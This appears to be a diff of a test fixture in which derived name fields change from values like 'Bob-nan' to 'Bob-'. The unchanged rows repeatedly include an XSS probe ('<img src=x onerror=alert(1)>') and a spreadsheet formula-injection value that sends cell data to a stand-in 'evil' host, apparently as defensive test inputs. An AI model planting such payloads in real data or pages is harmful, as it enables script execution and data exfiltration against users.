@@ -78,7 +78,7 @@
     "s:'Carol'",
     "s:'carol2@example.com'",
     "s:'<img src=x onerror=alert(1)>'",
-    "s:'Carol-nan'"
+    "s:'Carol-'"
    ],
    [
     "s:'PR-00004'",
@@ -129,7 +129,7 @@
     "s:'Bob'",
     "s:'bob5@example.com'",
     "s:'x|||y'",
-    "s:'Bob-nan'"
+    "s:'Bob-'"
    ],
    [
     "s:'PR-00007'",
@@ -180,7 +180,7 @@
     "s:'Alice'",
     "s:'alice8@example.com'",
     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-    "s:'Alice-nan'"
+    "s:'Alice-'"
    ],
    [
     "s:'PR-00010'",
@@ -231,7 +231,7 @@
     "s:'Dave'",
     "s:'dave11@example.com'",
     "s:'café'",
-    "s:'Dave-nan'"
+    "s:'Dave-'"
    ],
    [
     "s:'PR-00013'",
@@ -282,7 +282,7 @@
     "s:'Carol'",
     "s:'carol14@example.com'",
     "s:'<img src=x onerror=alert(1)>'",
-    "s:'Carol-nan'"
+    "s:'Carol-'"
    ],
    [
     "s:'PR-00016'",
@@ -333,7 +333,7 @@
     "s:'Bob'",
     "s:'bob17@example.com'",
     "s:'x|||y'",
-    "s:'Bob-nan'"
+    "s:'Bob-'"
    ],
    [
     "s:'PR-00019'",
@@ -384,7 +384,7 @@
     "s:'Alice'",
     "s:'alice20@example.com'",
     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-    "s:'Alice-nan'"
+    "s:'Alice-'"
    ],
    [
     "s:'PR-00022'",
@@ -435,7 +435,7 @@
     "s:'Dave'",
     "s:'dave23@example.com'",
     "s:'café'",
-    "s:'Dave-nan'"
+    "s:'Dave-'"
    ],
    [
     "s:'PR-00025'",
@@ -486,7 +486,7 @@
     "s:'Carol'",
     "s:'carol26@example.com'",
     "s:'<img src=x onerror=alert(1)>'",
-    "s:'Carol-nan'"
+    "s:'Carol-'"
    ],
    [
     "s:'PR-00028'",
@@ -537,7 +537,7 @@
     "s:'Bob'",
     "s:'bob29@example.com'",
     "s:'x|||y'",
-    "s:'Bob-nan'"
+    "s:'Bob-'"
    ],
    [
     "s:'PR-00031'",
@@ -588,7 +588,7 @@
     "s:'Alice'",
     "s:'alice32@example.com'",
     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-    "s:'Alice-nan'"
+    "s:'Alice-'"
    ],
    [
     "s:'PR-00034'",
@@ -639,7 +639,7 @@
     "s:'Dave'",
     "s:'dave35@example.com'",
     "s:'café'",
-    "s:'Dave-nan'"
+    "s:'Dave-'"
    ],
    [
     "s:'PR-00037'",
@@ -690,7 +690,7 @@
     "s:'Carol'",
     "s:'carol38@example.com'",
     "s:'<img src=x onerror=alert(1)>'",
-    "s:'Carol-nan'"
+    "s:'Carol-'"
    ],
    [
     "s:'PR-00040'",
